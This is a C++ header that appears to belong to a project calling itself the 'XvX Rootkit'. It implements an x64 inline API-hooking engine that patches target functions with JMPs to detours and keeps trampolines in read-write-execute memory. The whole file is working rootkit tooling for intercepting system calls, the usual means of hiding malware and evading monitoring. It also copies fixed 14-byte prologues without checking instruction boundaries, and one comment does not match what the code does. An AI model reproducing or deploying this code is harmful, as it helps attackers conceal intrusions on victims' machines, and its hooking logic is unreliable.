/*
 * XvX Rootkit - Inline Hook Header
 * Copyright (c) 2025 - 28zaakypro@proton.me
 *
 * x64 inline hooking engine for API interception with trampoline.
 */

#ifndef INLINEHOOK_H
#define INLINEHOOK_H

#include <windows.h>
#include <cstdint>

#define TRAMPOLINE_SIZE 64

typedef struct _HookContext
{
    PVOID pTarget; // Address of the function to hook
    PVOID pDetour; // Address of our hooked function
    BYTE originalBytes[14];
    BYTE trampoline[TRAMPOLINE_SIZE];
    PVOID pTrampoline;
    BOOL isInstalled;
} HookContext;

BOOL InstallInlineHook(PVOID pTarget, PVOID pDetour, HookContext *pContext)
{
    if (!pTarget || !pDetour || !pContext)
        return FALSE;

    pContext->pTarget = pTarget;
    pContext->pDetour = pDetour;
    pContext->isInstalled = FALSE;

    // 1. Save original bytes
    memcpy(pContext->originalBytes, pTarget, 14);

    // 2. Create trampoline

    // Allocate executable memory near ntdll.dll
    pContext->pTrampoline = VirtualAlloc(NULL, TRAMPOLINE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pContext->pTrampoline)
        return FALSE;

    BYTE *pTramp = (BYTE *)pContext->pTrampoline;

    memcpy(pTramp, pContext->originalBytes, 14);
    pTramp += 14;

    // Add an absolute JMP to the original function+14 (x64: FF 25 + offset + address)
    // FF 25 00 00 00 00 : JMP [RIP+0]
    // Followed by the 64-bit address
    pTramp[0] = 0xFF;
    pTramp[1] = 0x25;
    *(DWORD *)(pTramp + 2) = 0;
    pTramp += 6;

    // Write the return address (original function + 14)
    *(UINT64 *)pTramp = (UINT64)((BYTE *)pTarget + 14);

    // 3. Calculate the distance between the target function and our detour
    INT64 distance = (INT64)((BYTE *)pDetour - (BYTE *)pTarget - 5);

    BYTE hookBytes[14];

    if (distance >= INT32_MIN && distance <= INT32_MAX)
    {
        hookBytes[0] = 0xE9;
        *(INT32 *)(hookBytes + 1) = (INT32)distance;

        // Fill the rest
        for (int i = 5; i < 14; i++)
        {
            hookBytes[i] = 0x90;
        }
    }
    else
    {
        hookBytes[0] = 0xFF;
        hookBytes[1] = 0x25;
        *(DWORD *)(hookBytes + 2) = 0;
        *(UINT64 *)(hookBytes + 6) = (UINT64)pDetour;
    }

    // 4. Change the protection of the target function
    DWORD oldProtect;
    if (!VirtualProtect(pTarget, 14, PAGE_EXECUTE_READWRITE, &oldProtect))
    {
        VirtualFree(pContext->pTrampoline, 0, MEM_RELEASE);
        return FALSE;
    }

    // 5. Install the hook (write the JMP)
    memcpy(pTarget, hookBytes, 14);

    // 6. Restore the protection
    VirtualProtect(pTarget, 14, oldProtect, &oldProtect);

    FlushInstructionCache(GetCurrentProcess(), pTarget, 14);

    pContext->isInstalled = TRUE;
    return TRUE;
}

BOOL UninstallInlineHook(HookContext *pContext)
{
    if (!pContext || !pContext->isInstalled)
        return FALSE;

    // Restore original bytes
    DWORD oldProtect;
    if (!VirtualProtect(pContext->pTarget, 14, PAGE_EXECUTE_READWRITE, &oldProtect))
    {
        return FALSE;
    }

    memcpy(pContext->pTarget, pContext->originalBytes, 14);
    VirtualProtect(pContext->pTarget, 14, oldProtect, &oldProtect);

    FlushInstructionCache(GetCurrentProcess(), pContext->pTarget, 14);

    // Free the trampoline
    if (pContext->pTrampoline)
    {
        VirtualFree(pContext->pTrampoline, 0, MEM_RELEASE);
        pContext->pTrampoline = NULL;
    }

    pContext->isInstalled = FALSE;
    return TRUE;
}

#endif // INLINEHOOK_H
